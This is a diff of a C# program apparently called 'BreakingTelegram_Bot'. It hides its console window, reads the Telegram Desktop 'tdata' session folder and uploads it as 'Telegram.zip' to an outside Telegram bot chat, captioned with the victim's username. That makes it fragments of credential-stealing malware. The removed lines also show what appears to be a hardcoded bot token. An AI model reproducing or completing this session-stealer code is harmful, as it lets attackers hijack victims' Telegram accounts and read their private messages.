@@ -20,7 +20,7 @@ namespace BreakingTelegram_Bot
         {
             FreeConsole();
 
-            botClient = new TelegramBotClient("6367638261:AAE02x8VuOTz8K0S9q-_8_iCWuzE8-oq2hk");
+            botClient = new TelegramBotClient("Your_bot_token");
 
             string folderName = "tdata";
 
@@ -41,7 +41,7 @@ namespace BreakingTelegram_Bot
                     var res = Environment.UserName;
 
                     await botClient.SendDocumentAsync(
-                        2017110018,
+                        "your_chat_id",
                         new InputOnlineFile(stream, "Telegram.zip"),
                         caption: $"{res} ning Telegram profili");
 
